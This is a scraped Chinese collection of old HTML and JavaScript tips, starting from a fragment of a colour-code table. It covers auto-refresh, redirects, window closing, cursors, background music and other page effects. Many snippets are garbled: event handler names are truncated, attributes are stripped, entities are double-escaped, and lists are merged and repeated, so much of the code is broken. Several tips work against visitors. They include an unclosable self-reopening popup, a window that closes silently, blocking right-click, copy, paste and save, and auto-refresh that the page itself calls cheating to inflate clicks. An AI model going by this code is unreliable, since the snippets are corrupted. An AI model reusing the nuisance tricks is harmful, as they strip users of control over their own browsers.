#6F424290猩红色 #BC171791海绿色 #238E6892半甜巧克力色 #6B422693赭色 #8E6B2394银色 #E6E8FA95天蓝 #3299CC96石板蓝 #007FFF97艳粉红色 #FF1CAE98春绿色 #00FF7F99钢蓝色 #236B8E100亮天蓝色 #38B0DE101棕褐色 #DB9370102紫红色 #D8BFD8103石板蓝色 #ADEAEA104浓深棕色 #5C4033105淡浅灰色 #CDCDCD106紫罗兰色 #4F2F4F107紫罗兰红色 #CC3299108麦黄色#D8D8BF109黄绿色 #99CC32忽视右键&lt;body &gt;或&lt;body style=&quot;overflow-y:hidden&quot;&gt;如何几秒后转到别的页面？&lt;META. HTTP-EQUIV=&quot;Refresh&quot; C&gt;点击关闭窗口&lt;a href=&quot;javascript:top.window.close();&quot;&gt;点击关闭窗口&lt;/a&gt;！请问如何去掉主页右面的滚动条？&lt;body scroll=&quot;no&quot;&gt;&lt;body style=&quot;overflow-y:hidden&quot;&gt;如何做到让一个网页自动关闭.&lt;html&gt;&lt;head&gt;&lt;OBJECT id=closes type=&quot;application/x-oleobject&quot; classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;&gt;&lt;param name=&quot;Command&quot; value=&quot;Close&quot;&gt;&lt;/object&gt;&lt;/head&gt;&lt;body &gt;这个窗口会在10秒过后自动关闭,而且不会出现提示. &lt;/body&gt;如何在不刷新页面的情况下刷新css?&lt;style&gt;button&#123; color:#000000;&#125;&lt;/style&gt;&lt;button nclick=document.styleSheets[0].rules[0].style.color=‘‘‘‘red‘‘‘‘&gt;点击按钮直接修改style标签里button选择符使按钮改为红色&lt;/button&gt;请问如何让网页自动刷新？在head部记入&lt;META. HTTP-EQUIV=&quot;Refresh&quot; c&gt;其中20为20秒后自动刷新，你可以更改为任意值。如何让页面自动刷新？方法一，用refreshHTML 代码片段如下:&lt;head&gt;&lt;meta. http-equiv=&quot;refresh&quot; c&gt;&lt;/head&gt;5表示刷新时间[Ctrl+A 全部选择 提示:你可先修改部分代码，再按运行]方法二，使用setTimeout控制&lt;img src=/logo.gif&gt;&lt;script&gt;function rl()&#123;document.location.reload()&#125;setTimeout(rl,2000)&lt;/script&gt;如何让超链接没有下划线在源代码中的&lt;HEAD&gt;…&lt;/HEAD&gt;之间输入如下代码：&lt;style type=&quot;text/css&quot;&gt; &lt;!--a &#123; text-decoration: none&#125;--&gt;&lt;/style请问如何去掉IE的上下滚动条？&lt;body style=&quot;overflow:scroll;overflow-y:hidden&quot;&gt;&lt;/body&gt;怎样才能把RealPlayer文件在网页做一个试听连接？&lt;embed height=25 src=51js.rm type=audio/x-pn-realaudio-plugin width=50 autostart=&quot;false&quot; /&gt;如何用html实现浏览器上后退按钮的功能？&lt;a href=&quot;javascript:history.go(-1)&quot;&gt;点击后退&lt;/a&gt;或者&lt;script&gt; history.back() &lt;/script&gt;请问怎么在网页中改变鼠标的箭头形状？HTML 代码片段如下:&lt;body&gt;&lt;a href=&quot;#&quot; style=&quot;cursor: auto;&quot;&gt;auto&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;#&quot; style=&quot;cursor: crosshair &quot;&gt;crosshair &lt;/a&gt;&lt;br&gt;&lt;a href=&quot;#&quot; style=&quot;cursor: default &quot;&gt;default &lt;/a&gt;&lt;br&gt;&lt;a href=&quot;#&quot; style=&quot;cursor: hand &quot;&gt;hand &lt;/a&gt;&lt;br&gt;&lt;a href=&quot;#&quot; style=&quot;cursor: move &quot;&gt;move &lt;/a&gt;&lt;br&gt;&lt;a href=&quot;#&quot; style=&quot;cursor: e-resize &quot;&gt;e-resize &lt;/a&gt;&lt;br&gt;&lt;a href=&quot;#&quot; style=&quot;cursor: ne-resize &quot;&gt;ne-resize &lt;/a&gt;&lt;br&gt;&lt;a href=&quot;#&quot; style=&quot;cursor: nw-resize&quot;&gt;nw-resize&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;#&quot; style=&quot;cursor: n-resize&quot;&gt;n-resize&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;#&quot; style=&quot;cursor: se-resize&quot;&gt;se-resize&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;#&quot; style=&quot;cursor: sw-resize&quot;&gt;sw-resize&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;#&quot; style=&quot;cursor: s-resize&quot;&gt;s-resize&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;#&quot; style=&quot;cursor: w-resize&quot;&gt;w-resize&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;#&quot; style=&quot;cursor: text&quot;&gt;text&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;#&quot; style=&quot;cursor: wait&quot;&gt;wait&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;#&quot; style=&quot;cursor: help&quot;&gt;help&lt;/a&gt;&lt;br&gt;&lt;/body&gt;怎样不使用页面的缓存？即每一次打开页面时不是调用缓存中的东西&lt;META. HTTP-EQUIV=&quot;pragma&quot;&gt;页面打开时自动弹出一个窗口的代码怎么写？HTML 代码片段如下:&lt;html&gt;&lt;head&gt;&lt;title&gt;Untitled Document&lt;/title&gt;&lt;meta http-equiv=&quot;Content-Type&quot;&gt;&lt;script&gt;&lt;!--function MM_openBrWindow(theURL,winName,features) &#123; //v2.0 window.open(theURL,winName,features);&#125;//--&gt;&lt;/script&lt;/head&gt;&lt;body bgcolor=&quot;#FFFFFF&quot; text=&quot;#000000&quot; &gt;&lt;/body&gt;&lt;/html&gt;如何让我的页面出现一个会讲话的小人？HTML 代码片段如下:&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;&lt;/TITLE&gt;&lt;META http-equiv=&quot;Content-Type&quot;&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;p&gt;&lt;OBJECT id=&quot;sims&quot; classid=&quot;CLSID45FD31B-5C6E-11D1-9EC1-00C04FD7081F&quot;&gt;&lt;/OBJECT&gt;&lt;SCRIPT&gt;var MerlinID;var MerlinACS;sims.Connected = true;MerlinLoaded = LoadLocalAgent(MerlinID, MerlinACS);Merlin = sims.Characters.Character(MerlinID);Merlin.Show();Merlin.Play(&quot;Surprised&quot;);Merlin.Speak(&quot;大家好&quot;);Merlin.Play(&quot;GestureLeft&quot;);Merlin.Think(&quot;我是默林！&quot;);Merlin.Play(&quot;leased&quot;);Merlin.Think(&quot;可爱吗？&quot;);Merlin.Play(&quot;GestureDown&quot;);Merlin.Speak(&quot;哈哈！&quot;);Merlin.Hide();function LoadLocalAgent(CharID, CharACS)&#123;LoadReq = sims.Characters.Load(CharID, CharACS);return(true);&#125;&lt;/SCRIPT&gt;&lt;/p&gt;&lt;p&gt; &lt;/p&gt;&lt;p&gt;看此效果必须装有office2000！！！&lt;/p&gt;&lt;/BODY&gt;&lt;/HTML&gt;在页面中如何加入不是满铺的背景图片,拉动页面时背景图不动HTML 代码片段如下:&lt;html&gt;&lt;head&gt;&lt;STYLE&gt;body &#123;background-image:url(logo.gif); background-repeat:no-repeat; background-position:center &#125;&lt;/STYLE&gt;&lt;/head&gt;&lt;body bgproperties=&quot;fixed&quot; &gt;&lt;/body&gt;&lt;/html&gt;[Ctrl+A 全部选择 提示: 你可先修改部分代码，再按运行]background-repeat:no-repeat; 是讓背景圖不占滿整個頁面body bgproperties=&quot;fixed&quot; 是拉動scroll時背景圖不動文本输入框什么属性能实现不可输入？HTML 代码片段如下:&lt;input type=&quot;text&quot; name=&quot;textfield&quot; disabled&gt;或者&lt;input type=&quot;text&quot; name=&quot;textfield&quot; readonly&gt;如何禁止自己的页面在别人的框架里打开？把以下代码加至你的&lt;head&gt;&lt;script&gt;if (window.top!=self)&#123;window.top.location=self.location&#125;&lt;/script&gt;如何实现首页全屏幕显示？HTML 代码片段如下:&lt;html&gt;&lt;body&gt;&lt;script&gt;var coolw=642var coolh=400var coolhuang=window.open(&quot;http://www.51js.com&quot;,&quot;coolhuang&quot;,&quot;width=&quot;+coolw+&quot;,height=&quot;+coolh+&quot;,fullscreen=1,toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0&quot;)window.close()&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;如何监听一个窗口被关闭了？HTML 代码片段如下:&lt;body&gt;如何禁止Ctrl+N？HTML 代码片段如下:&lt;body nkeydown=return(!(event.keyCode==78&amp;&amp;event.ctrlKey))&gt;如何把页面加入用户的收藏夹？HTML 代码片段如下:&lt;a href=&quot;javascript:window.external.AddFavorite(&#x27;http://www.51js.com&#x27;,&#x27;无忧脚本&#x27;)&quot;&gt;收藏无忧脚本&lt;/a&gt;如何在我的页面中加入背景音乐？IE: &lt;bgsound src=&quot;*.mid&quot; loop=infinite&gt;NS:&lt;embed src=&quot;*.mid&quot; autostart=true hidden=true loop=true&gt;*.mid你的背景音乐的midi格式文件关于页面转换效果&lt;meta http-equiv=&quot;page-enter&quot; &gt;或&lt;meta http-equiv=&quot;page-exit&quot; &gt;说明：Transition=23是随机效果，另可以选0-22任一数字固定某个效果如何设定打开页面的大小HTML 代码片段如下:&lt;body &gt;&lt;!--(width，height)--&gt;怎样双击滚屏，单击停止？HTML 代码片段如下:&lt;html&gt;&lt;head&gt;&lt;title&gt;新網頁1&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script &gt;var currentpos,timer;function initialize()&#123;timer=setInterval(&quot;scrollwindow()&quot;,10);&#125;function sc()&#123;clearInterval(timer);&#125;function scrollwindow()&#123;currentpos=document.body.scrollTop;window.scroll(0,++currentpos);if (currentpos != document.body.scrollTop)sc();&#125;document.onmousedown=scdocument.ondblclick=initialize&lt;/script&lt;p&gt;a&lt;/p&gt;&lt;p&gt;a&lt;/p&gt;&lt;p&gt;a&lt;/p&gt;&lt;p&gt;aa&lt;/p&gt;&lt;p&gt;aa&lt;/p&gt;&lt;p&gt;aa&lt;/p&gt;&lt;p&gt;aa&lt;/p&gt;&lt;p&gt;aa&lt;/p&gt;&lt;p&gt;aa&lt;/p&gt;&lt;p&gt;aa&lt;/p&gt;&lt;p&gt;aa&lt;/p&gt;&lt;p&gt;aa&lt;/p&gt;&lt;p&gt;aa&lt;/p&gt;&lt;p&gt;aa&lt;/p&gt;&lt;p&gt;aa&lt;/p&gt;&lt;p&gt;aa&lt;/p&gt;&lt;p&gt;aa&lt;/p&gt;&lt;p&gt;aa&lt;/p&gt;&lt;p&gt;aa&lt;/p&gt;&lt;p&gt;aa&lt;/p&gt;&lt;p&gt;aa&lt;/p&gt;&lt;p&gt;aa&lt;/p&gt;&lt;p&gt;a&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;如何让body中的文字不被选中？HTML 代码片段如下:&lt;body &gt;aaa&lt;/body&gt;如何让弹出的窗口不能关闭？在新开的窗口中加入如下代码&lt;body nunload=open(location.href)&gt;&lt;/body&gt;如何让浏览器在保存页面时保存失败？HTML 代码片段如下:&lt;NOSCRIPT&gt;&lt;&lt;B style=&quot;color:black;background-color:#ffff66&quot;&gt;IFRAME&lt;/B&gt; SRC=&quot;*.html&quot;&gt;&lt;/&lt;B style=&quot;color:black;background-color:#ffff66&quot;&gt;IFRAME&lt;/B&gt;&gt;&lt;/NOSCRIPT&gt;表单中如何用图片按钮实现 reset?&lt;html&gt;&lt;head&gt;&lt;script&gt;function aaa()&#123;document.forms[0].reset()&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form&gt;&lt;textarea rows=&quot;2&quot; name=&quot;S1&quot; cols=&quot;20&quot;&gt;&lt;/textarea&gt;&lt;input type=&quot;submit&quot; values=&quot;提交&quot; name=&quot;B1&quot;&gt;&lt;image src=&quot;logo.gif&quot; nclick=aaa()&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;进入网页时弹出的信息对话框&lt;body &gt;关闭窗口后弹出对话框&lt;body &gt;告别提示&lt;body nUnload= alert(&quot;再见，感谢你的访问！&quot;)&gt;只要你肯干,没有什么不能成功的.1。忽视右键 &lt;body ncontextmenu=&quot;return false&quot;&gt; 或 &lt;body style=&quot;erflow-y:hidden&quot;&gt;2。加入背景音乐 IE:&lt;bgsound src=&quot;*.mid&quot; loop=infinite&gt; NS:&lt;embed src=&quot;*.mid&quot; autostart=true hidden=true loop=true&gt; &lt;/embed&gt; *.mid你的背景音乐的midi格式文件3。简单的window.open方法 &lt;a href=&quot;#&quot; onclick=&quot;javascript:window.open(文件路径/文件名,newwindow,toolbar=no,scrollbars=yes,resizable=no,top=0,left=0,width=400,height=300);&quot;&gt;文字或图片&lt;/a&gt; 参数解释： &lt;SCRIPT&gt; js脚本开始； window.open 弹出新窗口的命令； 文件路径/文件名 弹出窗口的文件名； newwindow 弹出窗口的名字（不是文件名），非必须，可用空代替； width=400 窗口宽度； height=300 窗口高度； top=0 窗口距离屏幕上方的象素值； left=0 窗口距离屏幕左侧的象素值； toolbar=no 是否显示工具栏，yes为显示； menubar，scrollbars 表示菜单栏和滚动栏。 resizable=no 是否允许改变窗口大小，yes为允许； location=no 是否显示地址栏，yes为允许； status=no 是否显示状态栏内的信息（通常是文件已经打开），yes为允许； &lt;/SCRIPT&gt; js脚本结束4。简单的页面加密 &lt;script&gt; &lt;!-- function loopy()&#123; var sWord =&quot;&quot;; while(sWord!=&quot;login&quot;)&#123;sWord=prompt(&quot;请输入你的登陆密码&quot;);&#125; alert(&quot;登陆成功！&quot;); &#125; loopy() //--&gt; &lt;/script&gt;5。拉动页面时背景图不动 &lt;style&gt; body&#123;background-image:url(logo.gif); background-repeat:no-repeat;background-position:center&#125; &lt;/style&gt;6。让浏览器在保存页面时保存失败 &lt;NOSCRIPT&gt;&lt;iframe. src=&quot;*.html&quot;&gt;&lt;/iframe&gt;&lt;/NOSCRIPT&gt;7。随机替换图片 &lt;script&gt; document.write(&lt;img src=&quot;img/+parseInt(Math.random()*(5))+.gif&quot;height=&quot;40&quot; width=&quot;50&quot;&gt; &lt;/script&gt; 图片文件名为0.gif 1.gif 2.gif 3.gif 4.gif8。窗口定时关闭 先将如下代码网页文件的区： &lt;script&gt; function closeit() &#123; setTimeout(&quot;self.close()&quot;,10000) //毫秒 &#125; &lt;/script 然后再在&lt;body&gt;标内加入如：&lt;body onload=&quot;closeit()&quot;&gt;9。网页自动关闭 &lt;html&gt; &lt;head&gt; &lt;object id=closes type=&quot;application/x-oleobject&quot; classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;&gt; &lt;param name=&quot;Command&quot; value=&quot;Close&quot;&gt; &lt;/object&gt; &lt;/head&gt; &lt;body nload=&quot;window.setTimeout(closes.Click(),10000)&quot;&gt; 这个窗口会在10秒过后自动关闭,而且不会出现提示. &lt;/body&gt; &lt;/html&gt; 10。网页自动刷新 在head部记入 &lt;META. HTTP-EQUIV=&quot;Refresh&quot; content=&quot;20&quot;&gt; 其中20为20秒后自动刷新，你可以更改为任意值。 11。网页自动转页 &lt;META. HTTP-EQUIV=&quot;Refresh&quot; CONTENT=&quot;时间(秒);URL=地址&quot;&gt; 12。保持layer在最前面，而不被Iframe、Object所覆盖 在Layer中再插Iframe. 或 Object 设z-Index值 &lt;div z-Index:2&gt;&lt;object xxx&gt;&lt;/object&gt; ＃ 前面 &lt;div z-Index:1&gt;&lt;object xxx&gt;&lt;/object&gt; ＃ 后面 &lt;div id=&quot;Layer2&quot; style=&quot;position:absolute; top:40;width:400px; height:95px;z-index:2&quot;&gt; height=100% width=100%&gt; &lt;iframe. width=0 height=0&gt;&lt;/iframe&gt; &lt;/div&gt; &lt;div id=&quot;Layer1&quot; style=&quot;position:absolute; top:50;width:200px; height:115px;z-index:1&quot;&gt; &lt;iframe. height=100% width=100%&gt;&lt;/iframe&gt; &lt;/div&gt; 13。返回上一页 &lt;a href=javascript:history.back(1)&gt;『返回上一页』&lt;/a&gt; 14。关闭窗口 &lt;a href=javascript:self.close()&gt;『关闭窗口』&lt;/a&gt; 15。关于iframe的透明背景 &lt;IFRAME. ID=&quot;iFrame1&quot; SRC=&quot;iframe.htm&quot; allowTransparency=&quot;true&quot; style=&quot;background-color: green&quot;&gt;&lt;/IFRAME&gt; 16. ncontextmenu=&quot;window.event.returnValue=false&quot; 将彻底屏蔽鼠标右键 &lt;table border ncontextmenu=return(false)&gt;&lt;td&gt;no&lt;/table&gt; 可用于Table 17. &lt;body nselectstart=&quot;return false&quot;&gt; 取消选取、防止复制 18.onpaste=&quot;return false&quot; 不准粘贴 19.oncopy=&quot;return false;&quot; ncut=&quot;return false;&quot; 防止复制 20. &lt;link rel=&quot;Shortcut Icon&quot; href=&quot;favicon.ico&quot;&gt; IE地址栏前换成自己的图标 21. &lt;link rel=&quot;Bookmark&quot; href=&quot;favicon.ico&quot;&gt; 可以在收藏夹中显示出你的图标 22. &lt;input style=&quot;ime-mode:disabled&quot;&gt; 关闭输入法 23. 永远都会带着框架 &lt;script&gt;&lt;!-- if (window == top)top.location.href = &quot;frames.htm&quot;; //frames.htm为框架网页 // --&gt;&lt;/script 24. 防止被人frame. &lt;SCRIPT&gt;&lt;!-- if (top.location != self.location)top.location=self.location; // --&gt;&lt;/SCRIPT&gt; 25. 网页将不能被另存为 &lt;noscript&gt;&lt;iframe. src=*.html&gt;&lt;/iframe&gt;&lt;/noscript&gt; 26. 查看网页源代码 &lt;input type=button value=查看网页源代码 onclick=&quot;window.location = &quot;view-source:&quot;+ &quot;http://www.pconline.com.cn&quot;&quot;&gt; 27.删除时确认 &lt;a href=&quot;javascript:if(confirm(&quot;确实要删除吗?&quot;))location=&quot;boos.asp? &amp;areyou=删除&amp;page=1&quot;&quot;&gt;删除&lt;/a&gt; 28.屏蔽功能键Shift,Alt,Ctrl &lt;script&gt; function look()&#123; if(event.shiftKey) alert(&quot;禁止按Shift键!&quot;); //可以换成ALT CTRL &#125; document.onkeydown=look; &lt;/script&gt; 29. 网页不会被缓存 &lt;META. HTTP-EQUIV=&quot;pragma&quot; CONTENT=&quot;no-cache&quot;&gt; &lt;META. HTTP-EQUIV=&quot;Cache-Control&quot; CONTENT=&quot;no-cache, must-revalidate&quot;&gt; &lt;META. HTTP-EQUIV=&quot;expires&quot; CONTENT=&quot;Wed, 26 Feb 1997 08:21:57 GMT&quot;&gt; 或者&lt;META. HTTP-EQUIV=&quot;expires&quot; CONTENT=&quot;0&quot;&gt; 30. 怎样让表单没有凹凸感？ &lt;input type=text style=&quot;border:1 solid #000000&quot;&gt; 或 &lt;input type=text style=&quot;border-left:none; border-right:none; border -top:none; border-bottom: 1 solid #000000&quot;&gt;&lt;/textarea&gt; 31.不要滚动条? 让竖条没有: &lt;body style=&quot;overflow:scroll;overflow-y:hidden&quot;&gt; &lt;/body&gt; 让横条没有: &lt;body style=&quot;overflow:scroll;overflow-x:hidden&quot;&gt; &lt;/body&gt; 两个都去掉？更简单了 &lt;body scroll=&quot;no&quot;&gt; &lt;/body&gt; 32. 怎样去掉图片链接点击后，图片周围的虚线？ &lt;a href=&quot;#&quot; nFocus=&quot;this.blur()&quot;&gt;&lt;img src=&quot;logo.jpg&quot; border=0&gt;&lt;/a&gt; 33. 电子邮件处理提交表单 &lt;form. name=&quot;form1&quot; method=&quot;post&quot; action=&quot;mailt****@***.com&quot; enctype=&quot;text/plain&quot;&gt; &lt;input type=submit&gt; &lt;/form&gt; 34. 在打开的子窗口刷新父窗口的代码里如何写？ window.opener.location.reload() 35. 如何设定打开页面的大小 &lt;body nload=&quot;top.resizeTo(300,200);&quot;&gt; 打开页面的位置&lt;body nload=&quot;top.moveBy(300,200);&quot;&gt; 36. 在页面中如何加入不是满铺的背景图片,拉动页面时背景图不动 &lt;STYLE&gt; body &#123;background-image:url(logo.gif); background-repeat:no-repeat; background-position:center;background-attachment: fixed&#125; &lt;/STYLE&gt; 37. 检查一段字符串是否全由数字组成 &lt;script&gt;&lt;!-- function checkNum(str)&#123;return str.match(//D/)==null&#125; alert(checkNum(&quot;1232142141&quot;)) alert(checkNum(&quot;123214214a1&quot;)) // --&gt;&lt;/script 38. 获得一个窗口的大小 document.body.clientWidth; document.body.clientHeight 39. 怎么判断是否是字符 if (/[^/x00-/xff]/g.test(s)) alert(&quot;含有汉字&quot;); else alert(&quot;全是字符&quot;); 40.TEXTAREA自适应文字行数的多少 &lt;textarea rows=1 name=s1 cols=27 onpropertychange=&quot;this.style.posHeight=this.scrollHeight&quot;&gt; &lt;/textarea&gt; 41. 日期减去天数等于第二个日期 &lt;script&gt; function cc(dd,dadd) &#123; //可以加上错误处理 var a = new Date(dd) a = a.valueOf() a = a - dadd * 24 * 60 * 60 * 1000 a = new Date(a) alert(a.getFullYear() + &quot;年&quot; + (a.getMonth() + 1) + &quot;月&quot; + a.getDate() + &quot;日&quot;) &#125; cc(&quot;12/23/2002&quot;,2) &lt;/script&gt; 42. 选择了哪一个Radio &lt;HTML&gt;&lt;script&gt; function checkme() for each ob in radio1 if ob.checked then window.alert ob.value next end function &lt;/script&gt;&lt;BODY&gt; &lt;INPUT name=&quot;radio1&quot; type=&quot;radio&quot; value=&quot;style&quot; checked&gt;Style. &lt;INPUT name=&quot;radio1&quot; type=&quot;radio&quot; value=&quot;barcode&quot;&gt;Barcode &lt;INPUT type=&quot;button&quot; value=&quot;check&quot; nclick=&quot;checkme()&quot;&gt; &lt;/BODY&gt;&lt;/HTML&gt; 43.脚本永不出错 &lt;SCRIPT&gt; &lt;!-- Hide function killErrors()&#123;return true;&#125; window.onerror = killErrors; // --&gt; &lt;/SCRIPT&gt; 44.ENTER键可以让光标移到下一个输入框 &lt;input nkeydown=&quot;if(event.keyCode==13)event.keyCode=9&quot;&gt; 45. 检测某个网站的链接速度： 把如下代码加入&lt;body&gt;区域中: &lt;script&gt; tim=1 setInterval(&quot;tim++&quot;,100) b=1 var autourl=new Array() autourl[1]=&quot;www.njcatv.net&quot; autourl[2]=&quot;javacool.3322.net&quot; autourl[3]=&quot;www.sina.com.cn&quot; autourl[4]=&quot;www.nuaa.edu.cn&quot; autourl[5]=&quot;www.cctv.com&quot; function butt()&#123; document.write(&quot;&lt;form. name=autof&gt;&quot;) for(var i=1;i&lt;autourl.length;i++) document.write(&quot;&lt;input type=text name=txt&quot;+i+&quot; size=10 value=测试中……&gt; =》&lt;input type=text name=url&quot;+i+&quot; size=40&gt; =》&lt;input type=button value=GO onclick=window.open(this.form.url&quot;+i+&quot;.value)&gt;&lt;br&gt;&quot;) document.write(&quot;&lt;input type=submit value=刷新 &gt;&lt;/form&gt;&quot;) &#125; butt() function auto(url)&#123; document.forms[0][&quot;url&quot;+b].value=url if(tim&gt;200) &#123;document.forms[0][&quot;txt&quot;+b].value=&quot;链接超时&quot;&#125; else &#123;document.forms[0][&quot;txt&quot;+b].value=&quot;时间&quot;+tim/10+&quot;秒&quot;&#125; b++ &#125; function run()&#123;for(var i=1;i&lt;autourl.length;i++)document.write(&quot;&lt;img src=http://&quot;+autourl+&quot;/&quot;+Math.random()+&quot; width=1 height=1 nerror=auto(&quot;http://&quot;+autourl+&quot;&quot;)&gt;&quot;)&#125; run()&lt;/script&gt; 46. 各种样式的光标 auto ：标准光标 default ：标准箭头 hand ：手形光标 wait ：等待光标 text ：I形光标 vertical-text ：水平I形光标 no-drop ：不可拖动光标 not-allowed ：无效光标 help ：?帮助光标 all-scroll ：三角方向标 move ：移动标 crosshair ：十字标 e-resize n-resize nw-resize w-resize s-resize se-resize sw-resize 进入网页时淡入淡出的效果。 1&lt;meta http-equiv=&quot;Page-Exit&quot;; content=&quot;blendTrans(Duration=1.0)&quot;&gt; 在头部head之间加入此代码，你会发现点击链接的时候，网页现实的是淡入淡出的效果。此代码含义如下：Page-Exit”（离开网页）、”Site-Enter”（进入站点）、”Site-Exit”（离开站点）其中”Duration=1.0″可以设定每个周期的时间为多久，单位是秒（现在设置的是每周期1秒）。 彻底屏蔽鼠标右键。此段代码加入区域。 1&lt;body oncontextmenu=&quot;window.event.returnValue=false&quot;&gt; 此段代码加入区域将取消选取、防止复制。 1&lt;body onselectstart=&quot;return false&quot;&gt; 不准粘贴。此段代码加入区域 1&lt;body onpaste=&quot;return false&quot;&gt; 脚本永不出错,如果您的浏览器提示您的网址JS脚本出错，但检测了一遍没发现错误，就可以使用一下代码： 1234&lt;SCRIPT &gt;&lt;!-- Hide function killErrors() &#123;return true;&#125; window.onerror = killErrors; // --&gt; &lt;/SCRIPT&gt; 在规定时间内跳转，意思就是5秒后自动跳转到该页面下，适合做404网页。 1&lt;META http-equiv=V=&quot;REFRESH&quot; content=&quot;5;URL=http://www.lusongsong.com&quot;&gt; 可防止复制，此段代码加入&lt; body&gt;区域 1&lt;body oncopy=&quot;return false;&quot; oncut=&quot;return false;&quot; &gt; 防止被人frame。例：有些网址导航站收录您的网址之后，不会直接跳转到你的网站，而是加载到他的网页中，这样不会给你的网站产生任何IP和PV。如果您不希望这样，那么请加入此段代码。 12&lt;SCRIPT&gt;&lt;!-- if (top.location != self.location)top.location=self.location;// --&gt;&lt;/SCRIPT&gt; 11：页面自动刷新，把如下代码加入 &lt; head&gt; 区域中 其中20指每隔20秒刷新一次页面. 可用户增加文章点击率，这是作弊行为。 1&lt;meta http-equiv= &quot;refresh &quot; content= &quot;20 &quot;&gt; , 输入汉字 1234&lt;INPUT onblur=&quot;if(this.value==&#x27;&#x27;)&#123;this.value=&#x27;2-4个汉字&#x27;;this.style.color=&#x27;#999999&#x27;&#125;else&#123;this.style.color=&#x27;#000000&#x27;&#125;;&quot; onkeyup=&quot;value=value.replace(/[^\\u4E00-\\u9FA5]/g,&#x27;&#x27;)&quot; style=&quot;WIDTH: 65px; COLOR: #999999&quot; onFocus=&quot;this.value=&#x27;&#x27;;&quot; maxLength=4 value=2-4个汉字 name=name&gt; 12oncontextmenu=&quot;window.event.returnValue=false&quot; 将彻底屏蔽鼠标右键&lt;table border oncontextmenu=return(false)&gt;&lt;td&gt;no&lt;/table&gt; 可用于Table 1&lt;body onselectstart=&quot;return false&quot;&gt; 取消选取、防止复制 1onpaste=&quot;return false&quot; 不准粘贴 1oncopy=&quot;return false;&quot; oncut=&quot;return false;&quot; 防止复制 1&lt;link rel=&quot;Shortcut Icon&quot; href=&quot;favicon.ico&quot;&gt; IE地址栏前换成自己的图标 1&lt;link rel=&quot;Bookmark&quot; href=&quot;favicon.ico&quot;&gt; 可以在收藏夹中显示出你的图标 1&lt;input style=&quot;ime-mode:disabled&quot;&gt; 关闭输入法 永远都会带着框架 123&lt;script&gt;&lt;!--if (window == top)top.location.href = &quot;frames.htm&quot;; //frames.htm为框架网页// --&gt;&lt;/script&gt; 防止被人frame 123&lt;SCRIPT&gt;&lt;!-- if (top.location != self.location)top.location=self.location;// --&gt;&lt;/SCRIPT&gt; 网页将不能被另存为 1&lt;noscript&gt;&lt;iframe src=&quot;/blog/*.html&gt;&quot;;&lt;/iframe&gt;&lt;/noscript&gt; 12&lt;input type=button value=查看网页源代码 onclick=&quot;window.location = &quot;view-source:&quot;+ &quot;http://www.180it.com&quot;&quot;&gt; 删除时确认 1&lt;a href=&quot;javascript:if(confirm(&quot;确实要删除吗?&quot;))location=&quot;boos.asp?&amp;areyou=删除&amp;page=1&quot;&quot;&gt;删除&lt;/a&gt; 取得控件的绝对位置 12345678910111213141516171819202122232425//Javascript&lt;script&gt;function getIE(e)&#123;var t=e.offsetTop;var l=e.offsetLeft;while(e=e.offsetParent)alert(&quot;top=&quot;+t+&quot;/nleft=&quot;+l);&#125;&lt;/script&gt;//VBScript&lt;script language=&quot;VBScript&quot;&gt;&lt;!--function getIE()dim t,l,a,bset a=document.all.img1t=document.all.img1.offsetTopl=document.all.img1.offsetLeftwhile a.tagName&lt;&gt;&quot;BODY&quot;set a = a.offsetParentt=t+a.offsetTopl=l+a.offsetLeftwendmsgbox &quot;top=&quot;&amp;t&amp;chr(13)&amp;&quot;left=&quot;&amp;l,64,&quot;得到控件的位置&quot;end function--&gt;&lt;/script&gt; 光标是停在文本框文字的最后 1234567891011&lt;script&gt;function cc()&#123;var e = event.srcElement;var r =e.createTextRange();r.moveStart(&quot;character&quot;,e.value.length);r.collapse(true);r.select();&#125;&lt;/script&gt;&lt;input type=text name=text1 value=&quot;123&quot; onfocus=&quot;cc()&quot;&gt; 判断上一页的来源 12javascript:document.referrer 最小化、最大化、关闭窗口 123456789&lt;object id=hh1 classid=&quot;clsid:ADB880A6-D8FF-11CF-9377-00AA003B7A11&quot;&gt; &lt;param name=&quot;Command&quot; value=&quot;Minimize&quot;&gt;&lt;/object&gt;&lt;object id=hh2 classid=&quot;clsid:ADB880A6-D8FF-11CF-9377-00AA003B7A11&quot;&gt; &lt;param name=&quot;Command&quot; value=&quot;Maximize&quot;&gt;&lt;/object&gt;&lt;OBJECT id=hh3 classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;&gt;&lt;PARAM NAME=&quot;Command&quot; VALUE=&quot;Close&quot;&gt;&lt;/OBJECT&gt;&lt;input type=button value=最小化 onclick=hh1.Click()&gt;&lt;input type=button value=最大化 onclick=hh2.Click()&gt;&lt;input type=button value=关闭 onclick=hh3.Click()&gt; 本例适用于IE 17.屏蔽功能键Shift,Alt,Ctrl 1234567&lt;script&gt;function look()&#123; if(event.shiftKey) alert(&quot;禁止按Shift键!&quot;); //可以换成ALT CTRL&#125; document.onkeydown=look; &lt;/script&gt; 网页不会被缓存 1234&lt;META HTTP-EQUIV=&quot;pragma&quot; CONTENT=&quot;no-cache&quot;&gt;&lt;META HTTP-EQUIV=&quot;Cache-Control&quot; CONTENT=&quot;no-cache, must-revalidate&quot;&gt;&lt;META HTTP-EQUIV=&quot;expires&quot; CONTENT=&quot;Wed, 26 Feb 1997 08:21:57 GMT&quot;&gt;或者&lt;META HTTP-EQUIV=&quot;expires&quot; CONTENT=&quot;0&quot;&gt; 怎样让表单没有凹凸感？ 12345&lt;input type=text 